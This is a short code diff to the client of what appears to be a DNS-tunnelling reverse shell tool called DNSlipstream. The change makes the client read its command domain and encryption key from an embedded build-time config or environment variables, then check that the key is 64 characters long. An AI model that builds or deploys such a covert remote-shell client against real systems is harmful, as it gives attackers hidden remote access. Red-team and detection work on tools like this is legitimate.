@@ -7,10 +7,29 @@ import platform
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
 from lib.transport.stream import dns_stream
 
-# Configuration - these should be set via command line or environment variables
-TARGET_DOMAIN = os.getenv('TARGET_DOMAIN', 'c.example.com')
-ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', '')
+# Try to import embedded config first
+try:
+    from lib.config_embedded import ENCRYPTION_KEY as EMBEDDED_KEY
+    from lib.config_embedded import DOMAIN_NAME as EMBEDDED_DOMAIN
+except ImportError:
+    EMBEDDED_KEY = None
+    EMBEDDED_DOMAIN = None
 
+# Get from environment or embedded config
+TARGET_DOMAIN = os.getenv('DOMAIN_NAME') or EMBEDDED_DOMAIN or 'c.example.com'
+ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY') or EMBEDDED_KEY or ''
+
+# Validate
+if not ENCRYPTION_KEY:
+    print("ERROR: ENCRYPTION_KEY not set!")
+    print("Build binary with embedded key or set environment variable.")
+    sys.exit(1)
+
+if len(ENCRYPTION_KEY) != 64:
+    print(f"ERROR: Invalid key length: {len(ENCRYPTION_KEY)}")
+    sys.exit(1)
+
+print(f"=== DNSlipstream Client ===")
 
 def main():
     """Main function to run the reverse shell client."""
